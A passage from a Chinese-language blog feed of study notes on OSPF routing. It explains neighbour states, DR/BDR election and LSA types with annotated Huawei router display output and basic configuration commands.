class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&lt;R1&gt;display</span> <span class="string">ospf lsdb ase 192.168.3.0</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">OSPF</span> <span class="string">Process 1 with Router ID 1.1.1.1</span></span><br><span class="line">    <span class="attr">Link</span> <span class="string">State Database</span></span><br><span class="line"></span><br><span class="line"> <span class="attr">Type</span>      : <span class="string">External       //表示的是5类的LSA</span></span><br><span class="line"> <span class="attr">Ls</span> <span class="string">id     : 192.168.3.0    //这条LSA的名字，是外部路由的网段</span></span><br><span class="line"> <span class="attr">Adv</span> <span class="string">rtr   : 6.6.6.6        //发布这条LSA的路由器，是ASBR的router-id</span></span><br><span class="line"> <span class="attr">Ls</span> <span class="string">age    : 1678 </span></span><br><span class="line"> <span class="attr">Len</span>       : <span class="string">36             //作用:在整个OSPF网络中，传输OSPF协议的外部路由</span></span><br><span class="line"> <span class="attr">Options</span>   :  <span class="string">E             //特点:只有ASBR可以产生5类LSA，5类LSA可以传输到整个OSPF网络的任何地方</span></span><br><span class="line"> <span class="attr">seq#</span>      : <span class="string">80000006             5类LSA在传输过程中，不会产生任何的变化</span></span><br><span class="line"> <span class="attr">chksum</span>    : <span class="string">0x83c5</span></span><br><span class="line"> <span class="attr">Net</span> <span class="string">mask  : 255.255.255.0 </span></span><br><span class="line"> <span class="attr">TOS</span> <span class="string">0  Metric: 1           // cost值是1</span></span><br><span class="line"> <span class="attr">E</span> <span class="string">type    : 2              //引入外部路由，默认的类型是2</span></span><br><span class="line"> <span class="attr">Forwarding</span> <span class="string">Address : 0.0.0.0     //转发地址0.0.0.0 代表的就是6.6.6.6自己</span></span><br><span class="line"> <span class="attr">Tag</span>       : <span class="string">1 </span></span><br><span class="line"> <span class="attr">Priority</span>  : <span class="string">Low</span></span><br></pre></td></tr></table></figure><h2 id="ASBR-Summary-LSA"><a href="#ASBR-Summary-LSA" class="headerlink" title="ASBR-Summary LSA"></a>ASBR-Summary LSA</h2><h3 id="AS-Summary-LSA详解"><a href="#AS-Summary-LSA详解" class="headerlink" title="AS-Summary LSA详解"></a>AS-Summary LSA详解</h3><p><strong>ASBR-Summary LSA（4类LSA）：</strong></p><ul><li>由ABR产生，描述到ASBR的路由，通告给除ASBR所在区域的其他相关区域</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&lt;R1&gt;dis</span> <span class="string">ospf lsdb asbr 6.6.6.6</span></span><br><span class="line"> <span class="attr">OSPF</span> <span class="string">Process 1 with Router ID 1.1.1.1</span></span><br><span class="line">           <span class="attr">Area</span>: <span class="string">0.0.0.12</span></span><br><span class="line">   <span class="attr">Link</span> <span class="string">State Database </span></span><br><span class="line"><span class="attr">Type</span>      : <span class="string">Sum-Asbr             //表示的是4类的LSA</span></span><br><span class="line"><span class="attr">Ls</span> <span class="string">id     : 6.6.6.6              //这条LSA的名字，是ASBR的Router-id</span></span><br><span class="line"><span class="attr">Adv</span> <span class="string">rtr   : 2.2.2.2              //发布这条LSA的路由器，是与ASBR在同一个区域的ABR的Router-id</span></span><br><span class="line"><span class="attr">Ls</span> <span class="string">age    : 1100              </span></span><br><span class="line"><span class="attr">Len</span>       : <span class="string">28                   //作用:在不同的OSPF区域之间，传递的ASBR的Router-id，帮助5类LSA计算外部路由</span></span><br><span class="line"><span class="attr">Options</span>   :  <span class="string">E                   //特点:只有ABR可以产生4类LSA</span></span><br><span class="line"><span class="attr">seq#</span>      : <span class="string">80000006                   4类LSA在传输过程中，每经过1个ABR，都会将经过的那个ABR的Router-id变成AdvRouter</span></span><br><span class="line"><span class="attr">chksum</span>    : <span class="string">0x2a09</span></span><br><span class="line"><span class="attr">Tos</span> <span class="string">0  metric: 4</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 园区网路由 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-园区网路由2</title>
      <link href="/posts/routing2.html"/>
      <url>/posts/routing2.html</url>
      
        <content type="html"><![CDATA[<h1 id="园区网路由"><a href="#园区网路由" class="headerlink" title="园区网路由"></a>园区网路由</h1><h2 id="OSPF网络类型"><a href="#OSPF网络类型" class="headerlink" title="OSPF网络类型"></a>OSPF网络类型</h2><h3 id="七大状态"><a href="#七大状态" class="headerlink" title="七大状态"></a>七大状态</h3><table><thead><tr><th align="left">状态</th><th align="left">状态描述</th></tr></thead><tbody><tr><td align="left">Down</td><td align="left">OSPF最开始的状态</td></tr><tr><td align="left">Init</td><td align="left">初始化状态，收到对端发来Hello报文后状态为Init，但Hello报文中不含自己的Router ID</td></tr><tr><td align="left">two-way</td><td align="left">收到的Hello报文中包含有自己的Router ID ，则状态为2-way</td></tr><tr><td align="left">Exstart</td><td align="left">信息交换初始化状态，交互第一个DD报文，开始建立邻接状态</td></tr><tr><td align="left">Exchange</td><td align="left">信息交换状态，交互其余所有的DD报文</td></tr><tr><td align="left">Loading</td><td align="left">交互LSR，LSU，LSACK报文</td></tr><tr><td align="left">Full</td><td align="left">完全邻接状态</td></tr></tbody></table><ul><li>Down：发送hello报文</li><li>Init：接收到邻居发来的hello报文，但是该hello报文中没有自己的router id</li><li>Two-way：接收到的hello报文中，有自己的router-id，选举DR&#x2F;BDR</li><li>Exstart: 交互第一个dd 报文，确认主从关系，保证传输可靠</li><li>Exchange：交互数据库描述信息</li><li>Loading：数据库同步</li><li>Full：完全邻接状态</li></ul><h3 id="建立邻居关系"><a href="#建立邻居关系" class="headerlink" title="建立邻居关系"></a>建立邻居关系</h3><ul><li>OSPF使用Hello报文发现和建立邻居关系</li><li>在以太网链路上，缺省时，OSPF采用组播的形式发送Hello报文（目的地址224.0.0.5）</li><li>OSPF Hello报文中包含了路由器的RouterID、邻居列表等信息</li></ul><p><img src="/../img/img_artical/net_sec/6.2.1.png" alt="6.2.1"></p><h3 id="同步数据库"><a href="#同步数据库" class="headerlink" title="同步数据库"></a>同步数据库</h3><p><img src="/../img/img_artical/net_sec/6.2.2.png" alt="6.2.2"></p><p><strong>DD报文部分字段解释</strong></p><ul><li>I：当发送连续多个DD报文时，如果这是第一个DD报文，则置为1，否则置为0</li><li>M (More)：当发送连续多个DD报文时，如果这是最后一个DD报文，则置为0。否则置为1，表示后面还有其他的DD报文</li><li>MS (Master&#x2F;Slave)：当两台OSPF路由器交换DD报文时，首先需要确定双方的主从关系，RouterID大的一方会成为Master。当值为1时表示发送方Master</li><li>DD sequence number：DD报文序列号。主从双方利用序列号来保证DD报文传输的可靠性和完整性</li></ul><h3 id="OSPF网络类型-1"><a href="#OSPF网络类型-1" class="headerlink" title="OSPF网络类型"></a>OSPF网络类型</h3><p><strong>为什么要有网络类型</strong></p><ul><li>因为OSPF运行在不同的链路层就会有不同的问题，比如运行在以太网，默认为广播的网络环境下，就会存在共享网段中邻居数量多的问题，占用设备资源的问题，所以有了多种网络类型来适应不同的网络环境</li></ul><p><strong>OSPF有四种网络类型</strong></p><ul><li>广播类型（Broadcast）</li><li>非广播类型（NBMA）</li><li>点到点类型（P2P）</li><li>点到多点类型（P2MP）</li></ul><p><strong>链路层协议</strong></p><ul><li><p>当链路层协议是Ethernet，OSPF网络类型默认是Broadcast</p></li><li><p>当链路层协议是fr（帧中继）时，国内都已经不用了，OSPF运行在这个网络环境中，默认使用NBMA的网络类型 （不常见）</p></li><li><p>数据链路层运行的协议为PPP或者HDLC时，默认的网络类型为P2P</p></li><li><p>点到多点就是多个点到点（不常见）</p></li></ul><h2 id="DR和BDR"><a href="#DR和BDR" class="headerlink" title="DR和BDR"></a>DR和BDR</h2><h3 id="广播网络中的问题"><a href="#广播网络中的问题" class="headerlink" title="广播网络中的问题"></a>广播网络中的问题</h3><p><strong>一个共享网段中，存在多个OSPF路由器，同步信息效率低</strong></p><ul><li>任何一台路由器都会与其余所有路由器建立邻接关系，会形成n*(n-1)&#x2F;2个邻接关系，管理复杂</li><li>重复的发送和接收数据库信息，浪费带宽和设备资源</li></ul><p><img src="/../img/img_artical/net_sec/6.2.3.png" alt="6.2.3"></p><h3 id="DR"><a href="#DR" class="headerlink" title="DR"></a>DR</h3><p><strong>DR（Designated Router）：指定路由器</strong></p><ul><li>其他所有路由器都与DR建立邻接关系，和DR交换链路状态信息</li><li>其他路由器之间不建立邻接关系，不直接交换链路状态信息</li></ul><p><img src="/../img/img_artical/net_sec/6.2.4.png" alt="6.2.4"></p><h3 id="BDR"><a href="#BDR" class="headerlink" title="BDR"></a>BDR</h3><p><strong>BDR（Backup Designated Router）：备份指定路由器</strong></p><ul><li>为了规避单点故障风险，通过选举BDR，在DR失效时快速接管DR的工作</li><li>当一个网段中，具有多个ospf路由器的时候，为了快速和可靠的实现ospf数据库同步，需要指定一个路由器，也就是DR</li><li>选举为DR后，本网段中其他所有路由器，仅仅和DR同步消息，所以DR就拥有全部的数据库信息，所以DR非常重要</li><li>如果DR一旦出现故障，会导致DR与其他所有的路由器的邻接关系失效，数据库无法同步信息，也无法进行路由计算和数据转发</li><li>所以为了规避单点故障风险，会选举备份指定路由器，也就是BDR</li><li>在DR失效时，BDR可以快速接管DR的工作</li></ul><p><img src="/../img/img_artical/net_sec/6.2.5.png" alt="6.2.5"></p><h3 id="DR和BDR的作用"><a href="#DR和BDR的作用" class="headerlink" title="DR和BDR的作用"></a>DR和BDR的作用</h3><ul><li>减少邻接关系，降低设备负担</li><li>降低OSPF协议流量</li><li>加快数据库同步</li></ul><h3 id="DR与BDR的选举规则"><a href="#DR与BDR的选举规则" class="headerlink" title="DR与BDR的选举规则"></a>DR与BDR的选举规则</h3><p><strong>DR&#x2F;BDR的选举是非抢占式的</strong></p><p><strong>DR&#x2F;BDR的选举是基于端口的</strong></p><ul><li>接口的DR优先级越大越优先</li><li>接口的DR优先级相等时，RouterID越大越优先</li></ul><p><strong>每个网段中DR只有一个，BDR可以没有，DR必须有一个，如果没有DR，邻居将会一直卡在Two-way状态，无法建立邻接，无法full</strong></p><p><strong>当DR优先级为0时,不参加DR选举，直接变成DR-other</strong></p><p><strong>哪个接口先配置IP地址和OSPF，哪个接口会成为DR</strong></p><p><img src="/../img/img_artical/net_sec/6.2.6.png" alt="6.2.6"></p><h3 id="不同网络类型中DR与BDR的选举操作"><a href="#不同网络类型中DR与BDR的选举操作" class="headerlink" title="不同网络类型中DR与BDR的选举操作"></a>不同网络类型中DR与BDR的选举操作</h3><table><thead><tr><th>OSPF网络类型</th><th align="left">是否选举DR</th><th align="left">是否和邻居建立邻接关系</th></tr></thead><tbody><tr><td>P2P</td><td align="left">否</td><td align="left">是</td></tr><tr><td>Broadcast</td><td align="left">是</td><td align="left">DR与BDR、DRother建立邻接关系，BDR与DR、DRother建立邻接关系，DRother之间只建立邻居关系</td></tr><tr><td>NBMA</td><td align="left">是</td><td align="left">DR与BDR、DRother建立邻接关系，BDR与DR、DRother建立邻接关系，DRother之间只建立邻居关系</td></tr><tr><td>P2MP</td><td align="left">否</td><td align="left">是</td></tr></tbody></table><h3 id="路由器接口的角色分类"><a href="#路由器接口的角色分类" class="headerlink" title="路由器接口的角色分类"></a>路由器接口的角色分类</h3><ul><li>DR：指定路由器</li><li>BDR：备份指定路由器</li><li>DR-other：其他路由器<ul><li>同网段中，接口既不是DR，也不是BDR，就是DR-other</li></ul></li></ul><h3 id="路由器接口的角色概述"><a href="#路由器接口的角色概述" class="headerlink" title="路由器接口的角色概述"></a>路由器接口的角色概述</h3><ul><li>DR，BDR，DR-other都是指的接口，不是指的路由器</li><li>是在同一网段中选举DR，不是在一个区域中选举DR</li><li>在运行OSPF的路由器的多个接口角色可能相同，也可能不同<ul><li>比如：同一台路由器1个接口是DR，另外1个接口是DR-other</li></ul></li></ul><h3 id="DR优先级"><a href="#DR优先级" class="headerlink" title="DR优先级"></a>DR优先级</h3><p><strong>查看接口的DR优先级</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R1]display</span> <span class="string">ospf interface</span></span><br><span class="line"></span><br><span class="line"> <span class="attr">OSPF</span> <span class="string">Process 1 with Router ID 3.3.3.3</span></span><br><span class="line"> <span class="attr">Interfaces</span> <span class="string"></span></span><br><span class="line"></span><br><span class="line"> <span class="attr">Area</span>: <span class="string">0.0.0.0      (MPLS TE not enabled)    ##优先级，默认1</span></span><br><span class="line"> <span class="attr">IP</span> <span class="string">Address      Type         State    Cost       Pri           DR              BDR </span></span><br><span class="line"> <span class="attr">192.168.23.3</span>    <span class="string">Broadcast    BDR      1          1             192.168.23.2    192.168.23.3</span></span><br><span class="line"> <span class="attr">192.168.34.3</span>    <span class="string">Broadcast    DR       1          1             192.168.34.3    192.168.34.4</span></span><br></pre></td></tr></table></figure><p><strong>优先级默认为1</strong></p><p><strong>修改接口的DR优先级</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R1-GigabitEthernet0/0/0]ospf</span> <span class="string">dr-priority 100               //修改接口优先级为100</span></span><br><span class="line"><span class="attr">&lt;R3&gt;reset</span> <span class="string">ospf process                                      //重启OSPF进程</span></span><br><span class="line"><span class="attr">Warning</span>: <span class="string">The OSPF process will be reset. Continue? [Y/N]:y</span></span><br></pre></td></tr></table></figure><h2 id="OSPF数据库"><a href="#OSPF数据库" class="headerlink" title="OSPF数据库"></a>OSPF数据库</h2><h3 id="OSPF数据库-1"><a href="#OSPF数据库-1" class="headerlink" title="OSPF数据库"></a>OSPF数据库</h3><p><strong>OSPF数据库</strong></p><ul><li>OSPF数据库中，包含的是自己的链路状态信息，以及从邻居设备所学习过来的链路状态信息</li><li>而OSPF协议，正是通过链路状态信息，才可以将最终的路由条目计算出来，用于指导数据转发</li></ul><p><strong>查看OSPF数据库</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&lt;R1&gt;display</span> <span class="string">ospf lsdb</span></span><br></pre></td></tr></table></figure><p><strong>LSDB：链路状态数据库</strong></p><ul><li>作用：存储LSA</li></ul><p><strong>LSA：链路状态通告</strong></p><ul><li>LSA是什么：用于计算路由的网段信息和拓扑信息</li><li>拓扑信息：拓扑图（我是谁，我连着谁）</li><li>网段信息：IP地址，掩码，cost值</li><li>拓扑信息和网段信息作用是什么？ 计算路由， 他们都属于计算路由的源材料</li><li>所以：LSA包含就是拓扑信息和网段信息，而拓扑信息和网段信息又是计算路由的原材料</li><li>所以LSA就是计算路由的原材料</li><li>数据库同步的过程，其实就是,邻居之间，LSA交换的过程</li></ul><h3 id="OSPF数据库解析"><a href="#OSPF数据库解析" class="headerlink" title="OSPF数据库解析"></a>OSPF数据库解析</h3><p><strong>查看OSPF数据库</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&lt;R1&gt;display</span> <span class="string">ospf lsdb </span></span><br><span class="line"></span><br><span class="line"> <span class="attr">OSPF</span> <span class="string">Process 1 with Router ID 1.1.1.1</span></span><br><span class="line"> <span class="attr">Link</span> <span class="string">State Database </span></span><br><span class="line"></span><br><span class="line">         <span class="attr">Area</span>: <span class="string">0.0.0.0</span></span><br><span class="line"> <span class="attr">Type</span>      <span class="string">LinkState ID    AdvRouter          Age  Len   Sequence   Metric</span></span><br><span class="line"> <span class="attr">Router</span>    <span class="string">2.2.2.2         2.2.2.2            186  36    8000000C       1</span></span><br><span class="line"> <span class="attr">Router</span>    <span class="string">1.1.1.1         1.1.1.1            186  36    8000000F       1</span></span><br><span class="line"> <span class="attr">Network</span>   <span class="string">192.168.12.1    1.1.1.1            186  32    80000009       0</span></span><br><span class="line"> <span class="attr">Sum-Net</span>   <span class="string">192.168.45.0    2.2.2.2            186  28    80000008       3</span></span><br></pre></td></tr></table></figure><h3 id="LSA结构"><a href="#LSA结构" class="headerlink" title="LSA结构"></a>LSA结构</h3><p><strong>LSA结构</strong></p><ul><li>Type：类型：表示的是LSA的各种类型</li><li>LinkState ID：名字：表示的是LSA的名字</li><li>AdvRouter：通告路由器：表示的是产生这个LSA的路由器的router-id</li><li>Age：年龄：表示的是LSA的老化时间，最大时间是3600s</li><li>Len：长度：表示的是LSA的大小（单位是字节）</li><li>Sequence：序列号：表示的LSA的新旧程度，数值越大表示越新</li><li>Metric：度量值：表示链路的度量值</li></ul><h3 id="常见的LSA类型"><a href="#常见的LSA类型" class="headerlink" title="常见的LSA类型"></a>常见的LSA类型</h3><table><thead><tr><th align="center">类型</th><th align="center">名称</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">路由LSA<br />（Router LSA）</td><td align="center">每个设备都会产生，描述了区域内路由器的网段信息、拓扑信息与开销值</td></tr><tr><td align="center">2</td><td align="center">网络LSA<br />（Network LSA）</td><td align="center">由DR产生，辅助1类LSA完善区域内的拓扑信息和掩码</td></tr><tr><td align="center">3</td><td align="center">网络汇总LSA<br />（Network Summary LSA）</td><td align="center">由ABR产生，描述区域内某个网段的路由，该类LSA主要用于区域间路由的传递</td></tr><tr><td align="center">4</td><td align="center">ASBR汇总LSA<br />（ASBR Summary LSA）</td><td align="center">由ASBR产生，描述到ASBR的路由</td></tr><tr><td align="center">5</td><td align="center">AS外部LSA<br />（AS External LSA）</td><td align="center">由ASBR产生，用于描述到达OSPF的外部路由</td></tr><tr><td align="center">7</td><td align="center">非完全末梢区域LSA<br />(NSSA LSA)</td><td align="center">由ASBR产生，用于描述到达OSPF的外部路由</td></tr></tbody></table><h2 id="Router-LSA详解"><a href="#Router-LSA详解" class="headerlink" title="Router LSA详解"></a>Router LSA详解</h2><h3 id="Router-LSA详解-1"><a href="#Router-LSA详解-1" class="headerlink" title="Router LSA详解"></a>Router LSA详解</h3><p><strong>Router LSA（1类LSA）：</strong></p><ul><li>每台OSPF路由器都会产生</li><li>它描述了该路由器的拓扑信息、接口网络信息、度量值</li><li>Router LSA只能在所属的区域内传播</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&lt;R2&gt;display</span> <span class="string">ospf lsdb router 2.2.2.2             //查看名字为2.2.2.2的LSA</span></span><br><span class="line"></span><br><span class="line"> <span class="attr">OSPF</span> <span class="string">Process 1 with Router ID 2.2.2.2</span></span><br><span class="line">         <span class="attr">Area</span>: <span class="string">0.0.0.0</span></span><br><span class="line"> <span class="attr">Link</span> <span class="string">State Database </span></span><br><span class="line"></span><br><span class="line">  <span class="attr">Type</span>      : <span class="string">Router                             //Router表示是1类LSA</span></span><br><span class="line">  <span class="attr">Ls</span> <span class="string">id     : 2.2.2.2                            //表示这条LSA的名字，是该路由器的RouterID</span></span><br><span class="line">  <span class="attr">Adv</span> <span class="string">rtr   : 2.2.2.2                            //发布这条LSA的路由器，用RouterID表示</span></span><br><span class="line">  <span class="attr">Ls</span> <span class="string">age    : 982                                //链路状态老化时间：此字段表示LSA已经生存的时间，单位是秒</span></span><br><span class="line">  <span class="attr">Len</span>       : <span class="string">36                                 //是一个包含LSA头部在内的LSA的总长度值</span></span><br><span class="line">  <span class="attr">Options</span>   :  <span class="string">E                                 //每一个bit都对应了OSPF所支持的某种特性</span></span><br><span class="line">  <span class="attr">seq#</span>      : <span class="string">8000000f                           //链路状态序列号：当LSA每次有新的实例产生时，序列号就会增加</span></span><br><span class="line">  <span class="attr">chksum</span>    : <span class="string">0xff30                             //校验和：用于保证数据的完整性和准确性。</span></span><br><span class="line">  <span class="attr">Link</span> <span class="string">count: 1                                  //作用：描述了设备的拓扑信息、网段信息、度量值</span></span><br><span class="line">   <span class="attr">*</span> <span class="string">Link ID: 192.168.23.2                       //特点：每个设备都会产生1类LSA,1类LSA只能在区域内传输</span></span><br><span class="line">     <span class="attr">Data</span>   : <span class="string">192.168.23.2 </span></span><br><span class="line">     <span class="attr">Link</span> <span class="string">Type: TransNet                         //连接类型           </span></span><br><span class="line">     <span class="attr">Metric</span> : <span class="string">1</span></span><br><span class="line">     </span><br><span class="line"><span class="attr">//广播型网络中的1类LSA，给出我们的信息遗漏两个重要的因素</span></span><br><span class="line">  <span class="attr">1）我们连接DR的那个接口的IP地址的掩码信息是多少，1类的LSA没有告诉我们</span></span><br><span class="line">     <span class="attr">192.168.23.2的掩码是多少，学习1类LSA的邻居是无法感知到的</span></span><br><span class="line">    </span><br><span class="line">  <span class="attr">2）通过1类的LSA，我们无法感知到邻居的存在，也无法感知用哪个接口连接着邻居</span></span><br><span class="line">    <span class="attr">只能感知到我们连接着DR</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">所以，在广播型网络中，我们学习到拓扑信息和网段信息不全，没有办法精确的计算出来路由</span></span><br><span class="line">  <span class="attr">所以在广播型网络中，我们还需要2类LSA来弥补1类LSA的不足</span></span><br></pre></td></tr></table></figure><p><strong>LSA的三元组：链路状态类型、链路状态ID、通告路由器三元组唯一地标识了一个LSA</strong><br><strong>判断LSA新旧：链路状态老化时间、链路状态序列号 、校验和用于判断LSA的新旧</strong></p><table><thead><tr><th align="left">Link Type</th><th align="left">Link ID</th><th align="left">Link Data</th></tr></thead><tbody><tr><td align="left">Point-to-Point(P2P)：描述一个从本路由器到邻居路由器之间的点到点链路，属于拓扑信息</td><td align="left">邻居路由器的Router ID</td><td align="left">宣告该Router LSA的路由器接口的IP地址</td></tr><tr><td align="left">TransNet：描述一个从本路由器到一个Transit网段(例如MA或者NBMA网段)的连接，属于拓扑信息</td><td align="left">DR的接口IP地址</td><td align="left">宣告该Router LSA的路由器接口的IP地址</td></tr><tr><td align="left">stubNet：描述一个从本路由器到一个stub网段(例如Loopback接口)的连接，属于网段信息</td><td align="left">宣告该RouterLSA的路由器接口的网络IP地址</td><td align="left">该Stub网络的网络掩码</td></tr></tbody></table><h2 id="Network-LSA详解"><a href="#Network-LSA详解" class="headerlink" title="Network LSA详解"></a>Network LSA详解</h2><h3 id="Network-LSA详解-1"><a href="#Network-LSA详解-1" class="headerlink" title="Network LSA详解"></a>Network LSA详解</h3><p><strong>Network LSA（2类LSA）：</strong></p><ul><li>由DR产生，描述本网段的链路状态，在所属的区域内传播</li><li>Network LSA记录了该网段内所有与DR建立了邻接关系的OSPF路由器，同时携带了该网段的网络掩码</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R2]display</span> <span class="string">ospf lsdb network 192.168.23.2</span></span><br><span class="line"></span><br><span class="line"> <span class="attr">OSPF</span> <span class="string">Process 1 with Router ID 2.2.2.2</span></span><br><span class="line">         <span class="attr">Area</span>: <span class="string">0.0.0.0</span></span><br><span class="line"> <span class="attr">Link</span> <span class="string">State Database </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="attr">Type</span>      : <span class="string">Network                    //表示是2类LSA</span></span><br><span class="line">  <span class="attr">Ls</span> <span class="string">id     : 192.168.23.2               //这条LSA的名字，是该网段中DR这个接口的IP地址                                                   Adv rtr   : 2.2.2.2                    //AdvRouter：发布这条LSA的路由器是DR接口所在的那台OSPF路由器的RouterID</span></span><br><span class="line">  <span class="attr">Ls</span> <span class="string">age    : 6                          </span></span><br><span class="line">  <span class="attr">Len</span>       : <span class="string">32                           </span></span><br><span class="line">  <span class="attr">Options</span>   :  <span class="string">E                       </span></span><br><span class="line">  <span class="attr">seq#</span>      : <span class="string">8000000a </span></span><br><span class="line">  <span class="attr">chksum</span>    : <span class="string">0x4a68</span></span><br><span class="line">  <span class="attr">Net</span> <span class="string">mask  : 255.255.255.0              //作用：补全DR所在网段的掩码信息，同时记录了该网段内所有与DR建立邻接关系的OSPF路由器，</span></span><br><span class="line">  <span class="attr">Priority</span>  : <span class="string">Low                          描述完整的区域内的拓扑信息</span></span><br><span class="line">     <span class="attr">Attached</span> <span class="string">Router    2.2.2.2          //特点：DR产生2类LSA，2类LSA仅仅在区域内传输</span></span><br><span class="line">     <span class="attr">Attached</span> <span class="string">Router    3.3.3.3          //最后两条信息，代表DR的管理范围</span></span><br><span class="line">                                           <span class="attr">也就是说：2.2.2.2</span> <span class="string">连接着DR，要和DR建立邻接关系，这个2.2.2.2归DR管理</span></span><br><span class="line">                                           <span class="attr">3.3.3.3</span> <span class="string">连接着DR，要和DR建立邻接关系，这个3.3.3.3归DR管理</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 园区网路由 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-园区网路由1</title>
      <link href="/posts/routing1.html"/>
      <url>/posts/routing1.html</url>
      
        <content type="html"><![CDATA[<h1 id="园区网路由"><a href="#园区网路由" class="headerlink" title="园区网路由"></a>园区网路由</h1><h2 id="动态路由的优势"><a href="#动态路由的优势" class="headerlink" title="动态路由的优势"></a>动态路由的优势</h2><h3 id="企业现状"><a href="#企业现状" class="headerlink" title="企业现状"></a>企业现状</h3><p><strong>随着企业的发展，网络规模也不断在扩大</strong></p><ul><li>网络设备、网段数量越来越多</li><li>需要配置的路由条目越来越多</li></ul><h3 id="存在问题"><a href="#存在问题" class="headerlink" title="存在问题"></a>存在问题</h3><p><strong>在大型网络中存在的问题</strong></p><ul><li>静态路由，配置工作量大，效率低，出错率高</li><li>静态路由不能动态感知网络变化，不会自动更新</li><li>设备新增或删减，网络地址变更时，静态路由需要重新配置</li><li>当网络拓扑发生变更时，维护工作量大，网络中断时间过长</li></ul><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p><strong>动态路由</strong></p><ul><li>动态路由协议可以自动更新，快速适应网络拓扑的变化</li></ul><p><strong>动态路由协议的特点</strong></p><ul><li>自动计算路由，无需手动配置</li><li>网络拓扑变更时，自动更新路由，无需手动配置</li><li>支持负载均衡，提高网络可靠性</li><li>能够选择出最优的路由</li></ul><h3 id="路由分类"><a href="#路由分类" class="headerlink" title="路由分类"></a>路由分类</h3><p><strong>–直连路由</strong></p><p><strong>–非直连路由</strong></p><ul><li>静态路由</li><li>动态路由<ul><li>IGP：内部网关路由协议-在同一个AS内部使用（在企业或者数据中心内部使用）<ul><li>DV：距离矢量路由协议<ul><li>RIP（v1&#x2F;v2）</li><li>IGRP-思科私有协议</li><li>EIGRP-思科私有协议</li></ul></li><li>LS：链路状态路由协议<ul><li>OSPF：开放式最短路径优先（企业用：功能多，可以精细化控制）</li><li>ISIS：中间系统到中间系统（数据中心用，转发能力强，大流量转发）</li></ul></li></ul></li><li>EGP：外部网关路由协议：在不同的AS之间使用（AS：自治系统）<ul><li>BGP：边界网关协议</li></ul></li></ul></li></ul><h2 id="OSPF概述"><a href="#OSPF概述" class="headerlink" title="OSPF概述"></a>OSPF概述</h2><h3 id="OSPF协议概述"><a href="#OSPF协议概述" class="headerlink" title="OSPF协议概述"></a>OSPF协议概述</h3><p><strong>OSPF协议概述</strong></p><ul><li>OSPF（Open Shortest Path First）：开放式最短路径优先</li><li>开放式：公有协议，所有厂商的设备都支持</li><li>最短路径优先：以最短路径，最快的方式转发数据包</li><li>作用：动态感知全网状态，自动计算最优路由，便于大型网络中对路由的管理和维护</li><li>应用：通常应用于企业内部和数据中心内部</li><li>版本：OSPFv2（IPv4）和OSPFv3（IPv6）</li><li>工作在OSI模型第三层，数据封装在IP头部后面，协议号为89</li><li>OSPF是基于链路状态的内部网关协议</li></ul><h3 id="OSPF协议优势"><a href="#OSPF协议优势" class="headerlink" 